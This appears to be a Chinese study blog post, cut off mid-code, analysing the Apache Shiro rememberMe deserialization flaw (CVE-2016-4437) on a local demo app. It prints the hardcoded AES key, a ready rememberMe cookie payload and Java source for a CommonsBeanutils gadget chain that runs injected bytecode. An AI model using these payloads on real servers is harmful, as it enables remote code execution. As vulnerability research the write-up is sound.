+        <h1 id="shiro反序列化漏洞学习"><a href="#shiro反序列化漏洞学习" class="headerlink" title="shiro反序列化漏洞学习"></a>shiro反序列化漏洞学习</h1><h2 id="shiro介绍"><a href="#shiro介绍" class="headerlink" title="shiro介绍"></a>shiro介绍</h2><p>  Apache Shiro是一个强大且易用的Java安全框架，提供了身份验证、授权、密码学和会话管理等功能。它被广泛用于保护各种类型的应用程序，包括Web应用、RESTful服务、移动应用和大型企业级应用。使用Shiro，你可以将安全性集成到应用程序中而不必担心复杂的实现细节。在历史上，shiro的历史漏洞大部分都是一些对路径未标准化进行的一个bypass。<strong>本文的调试和漏洞复现仅针对Shiro体系下的 反序列化漏洞</strong>。</p>
+<h2 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>  在默认情况下 , Apache Shiro 使用 CookieRememberMeManager 对用户身份进行序列化&#x2F;反序列化 , 加密&#x2F;解密和编码&#x2F;解码 , 以供以后检索 。因此 , 当 Apache Shiro 接收到未经身份验证的用户请求时 , 会执行以下操作来寻找他们被记住的身份.</p>
+<p>从请求数据包中提取 Cookie 中 rememberMe 字段的值，对提取的 Cookie 值进行 Base64 解码，对 Base64 解码后的值进行 AES 解密，对解密后的字节数组调用 ObjectInputStream.readObject() 方法来反序列化。</p>
+<p>但是默认AES加密密钥是 “硬编码” 在代码中的 。<strong>硬编码的值为：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</strong>  因此 , 如果服务端采用默认加密密钥 , 那么攻击者就可以构造一个恶意对象 , 并对其进行序列化 , AES加密 , Base64编码 , 将其作为 Cookie 中 rememberMe 字段值发送 。 Apache Shiro 在接收到请求时会反序列化恶意对象 , 从而执行攻击者指定的任意代码 。</p>
+<p>Shiro 550 反序列化漏洞存在版本：<strong>shiro &lt;&#x3D;1.2.4</strong>，产生原因是因为shiro接受了Cookie里面rememberMe的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>  拉取源码：<a target="_blank" rel="noopener" href="https://github.com/yyhuni/shiroMemshell/tree/master/shirodemo">https://github.com/yyhuni/shiroMemshell/tree/master/shirodemo</a></p>
+<p>  解压之后选择跟我一样的目录使用idea去打开，这是可参考我的的目录：E:\ideaproject\shiroMemshell\shirodemo</p>
+<p>  我的环境如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java版本：1.8.441   </span><br><span class="line">tomcat版本：8.5.50</span><br><span class="line">shiro项目版本：1.2.4</span><br></pre></td></tr></table></figure>
+
+<p>  启动项目之后 成功的界面如下，访问：<a target="_blank" rel="noopener" href="http://localhost:8087/shirodemo_war/login.jsp">http://localhost:8087/shirodemo_war/login.jsp</a>   之后我们准备调试,调试之前还需要做以下事情。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419152806052.png" class="" title="image-20260419152806052">
+
+<p>  我们勾选Remember me进行抓包 拿到的数据包如下，我们勾选了之后Cookies是没有Rememberme参数的，这里需要手动添加，我们这里给Rememberme先附上一个弹计算器的值在进行调试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /shirodemo_war/login.jsp HTTP/1.1</span><br><span class="line">Host: localhost:8087</span><br><span class="line">Content-Length: 34</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Not=A?Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;140&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://localhost:8087</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:8087/shirodemo_war/login.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: JSESSIONID=68DED8AD99017EFD31A332BFC4636608; JSESSIONID=F15E0F07B9931B8EC068DA3893E319FC</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">username=a&amp;password=a&amp;submit=Login</span><br></pre></td></tr></table></figure>
+
+<p>可以直接复制到Cookies处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=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</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419153252621.png" class="" title="image-20260419153252621">
+
+<p>  接下来我们在idea进入调试阶段，我们在发这个带有Rememberme的数据包就可以打断点调试了。</p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>  我们在入口点AbstractRememberMeManager.getRememberedSerializedIdentity()打上断点进行分析。进入debug阶段，我们再这里打上断点，然后发携带有Rememberme字段Cookies的数据包，就断住了。此图可以看见shiro的加密方式配置。</p>
+<p>  为什么</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419154346322.png" class="" title="image-20260419154346322">
+
+<p>跟进去看看</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419155732106.png" class="" title="image-20260419155732106">
+
+<p>跟进CookieRememberMeManager.getRememberedSerializedIdentity() 上面那些不是很重要，走到这里这里已经把我们的cookies的值给读取到了</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419161303504.png" class="" title="image-20260419161303504">
+
+<p>这里检查是否删除了标志Cookie的标志值（deleteMe），如果是则返回null</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419161627062.png" class="" title="image-20260419161627062">
+
+<p>  而 base64 &#x3D; ensurePadding(base64) 这段话跟进去的话我们看注释，意思是说确保Cookies的值是否填充（padding）正确，就是检查格式。 大概代码逻辑是是处理 Base64 末尾 <code>=</code> 号补齐的问题，然后直接 Base64 解码返回字节数组。感兴趣可以点入看看我们就直接来到这：byte[] decoded &#x3D; Base64.decode(base64); 很明显就是<strong>base64解密了</strong>。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419162200943.png" class="" title="image-20260419162200943">
+
+<p>  所以我们总结这个CookieRememberMeManager.getRememberedSerializedIdentity() 的方法就是检查Cookies是否有无填充，然后获取Cookies之后，对其进行了base64的解密。</p>
+<p>  然后我们跟完这个方法我们又跟进去这个convertBytesToPrincipals方法里。这个bytes的数组就是我们上一个方法getRememberedSerializedIdentity()这里处理过的字节数组。 我们跟进去来到AbstractRememberMeManager.convertBytesToPrincipals这个方法里。可以看到这个方法就做了两步，解密之后，然后再进行了反序列化。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419162838289.png" class="" title="image-20260419162838289">
+
+<p>我们跟进decrypt里看看，来到这里。这里我们再跟进cipherService.decrypt这里看看具体的解密逻辑是怎么样的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419164754751.png" class="" title="image-20260419164754751">
+
+<p>调用了JcaCipherService.decrypt的解密方法，代码如下，给ai解读一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException &#123;</span><br><span class="line"></span><br><span class="line">    byte[] encrypted = ciphertext;</span><br><span class="line"></span><br><span class="line">    //No IV, check if we need to read the IV from the stream:</span><br><span class="line">    byte[] iv = null;</span><br><span class="line"></span><br><span class="line">    if (isGenerateInitializationVectors(false)) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span><br><span class="line">            //is:</span><br><span class="line">            // - the first N bytes is the initialization vector, where N equals the value of the</span><br><span class="line">            // &#x27;initializationVectorSize&#x27; attribute.</span><br><span class="line">            // - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span><br><span class="line"></span><br><span class="line">            //So we need to chunk the method argument into its constituent parts to find the IV and then use</span><br><span class="line">            //the IV to decrypt the real ciphertext:</span><br><span class="line"></span><br><span class="line">            int ivSize = getInitializationVectorSize();</span><br><span class="line">            int ivByteSize = ivSize / BITS_PER_BYTE;</span><br><span class="line"></span><br><span class="line">            //now we know how large the iv is, so extract the iv bytes:</span><br><span class="line">            iv = new byte[ivByteSize];</span><br><span class="line">            System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);</span><br><span class="line"></span><br><span class="line">            //remaining data is the actual encrypted ciphertext.  Isolate it:</span><br><span class="line">            int encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = new byte[encryptedSize];</span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            String msg = &quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;;</span><br><span class="line">            throw new CryptoException(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">我让ai生成了图解：</span><br><span class="line"></span><br><span class="line">密文结构（当启用IV生成时）:</span><br><span class="line">┌─────────────────┬─────────────────────────┐</span><br><span class="line">│   IV (16字节)    │      实际加密数据         │</span><br><span class="line">│  (前N字节)       │   (剩余 length-N 字节)   │</span><br><span class="line">└─────────────────┴─────────────────────────┘</span><br><span class="line">         ↓                    ↓</span><br><span class="line">    System.arraycopy      System.arraycopy</span><br><span class="line">    (提取IV)              (提取密文)</span><br><span class="line">         ↓                    ↓</span><br><span class="line">       iv[]              encrypted[]</span><br><span class="line">         └────────────────────┘</span><br><span class="line">                  ↓</span><br><span class="line">         decrypt(encrypted, key, iv)</span><br><span class="line">              AES-CBC解密</span><br><span class="line">              </span><br><span class="line">              默认128位=16字节</span><br><span class="line">              就是提取前16字节作为IV</span><br><span class="line">              剩余字节为实际密文</span><br><span class="line">              使用提取的IV进行AES-CBC解密</span><br></pre></td></tr></table></figure>
+
+<p>我们最后关注一下这个getDecryptionCipherKey，这个就是shiro的私钥了。这里是硬编码</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419170949104.png" class="" title="image-20260419170949104">
+
+<p>我们在这里找到它的构造函数，DEFAULT_CIPHER_KEY_BYTES这是一个常量 我们再跟进去就看到他的密钥了。如下，密钥值那就为：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171052942.png" class="" title="image-20260419171052942">
+
+<p>最后我们来到反序列化函数处了，我们再跟进</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171424034.png" class="" title="image-20260419171424034">
+
+<p>这里的readObject就是java原生的反序列化了。所以反序列化这里是没有经过什么过滤处理的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171716017.png" class="" title="image-20260419171716017">
+
+<p>点F9执行，已经弹出计算器了。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419171752888.png" class="" title="image-20260419171752888">
+
+<h3 id="Shiro反序列化的坑点"><a href="#Shiro反序列化的坑点" class="headerlink" title="Shiro反序列化的坑点"></a>Shiro反序列化的坑点</h3><h4 id="原生CB不依赖CC链"><a href="#原生CB不依赖CC链" class="headerlink" title="原生CB不依赖CC链"></a>原生CB不依赖CC链</h4><p>  Shiro这个组件它是<strong>内置CB链</strong>的，所以我们可以利用CB链来进行打反序列化的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260419205601351.png" class="" title="image-20260419205601351">
+
+<p>  这里的重心并非是教学CB链。可以自行学习反序列化CB链，网上有很多文章。这里单开一个主题的原因是CB链打CB链的时候会爆一个：org.apache.commons.collections.comparators.ComparableComparator类，从包名即可看出，这个类是来自于commons-collections 虽然shiro包含了一部分的cc类，但终究是不全的。那么我们怎么打不需要依赖的CC链呢？</p>
+<p>  我们找一个能代替ComparableComparator的类。这里需要符合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实现java.io.Serializable</span><br><span class="line">实现 java.util.Comparator</span><br><span class="line">且最好是jdk原生/shiro包下实现最好，不依赖第三方的组件包</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420025803304.png" class="" title="image-20260420025803304">
+
+<p>  P牛的java安全漫谈给出了一个符合条件类：CaseInsensitiveComparator，至此CB无依赖CC链编写如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">package com.cc;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cbnocc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;abc&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        byte[] evil = Files.readAllBytes(Paths.get(&quot;E:\\ideaproject\\reflectdemo\\src\\main\\java\\calcxlan.class&quot;));</span><br><span class="line">        byte[][] code=&#123; evil &#125;;</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,code);</span><br><span class="line">        //   PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br><span class="line">        //改成jdk原生调用，CaseInsensitiveComparator类是java.lang.String类下的一个内部私有类，其实现了 Comparator和Serializable，且位于Java的核心代码</span><br><span class="line">        //通过String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的CaseInsensitiveComparator对象，用它来实例化 BeanComparator</span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);</span><br><span class="line">        //这里改成字符串的形式，因为comparer指定了string，报int不能转换字符串</span><br><span class="line">        priorityQueue.add(&quot;1&quot;);</span><br><span class="line">        priorityQueue.add(&quot;2&quot;);</span><br><span class="line">        //通过 反射修改 BeanComparator 的值property的内容改成 outputProperties</span><br><span class="line">        setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br><span class="line">        //通过反射 PriorityQueue修改  queue值 为 TemplatesImpl对象</span><br><span class="line">        setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates,templates&#125;);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void  deserialize() throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        Object o =  ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那除此之外我们还能找到CaseInsensitiveComparator以外的类吗？我再原生JDK包下 ：com.sun.org.apache.xml.internal.security.c14n.helper 也找到了一个类：AttrCompare  (符合条件的有很多)</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420030524322.png" class="" title="image-20260420030524322">
+
+<p>  用ai跑了一个poc出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">package com.cc;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;</span><br><span class="line">import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;</span><br><span class="line">import javassist.ClassClassPath;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import 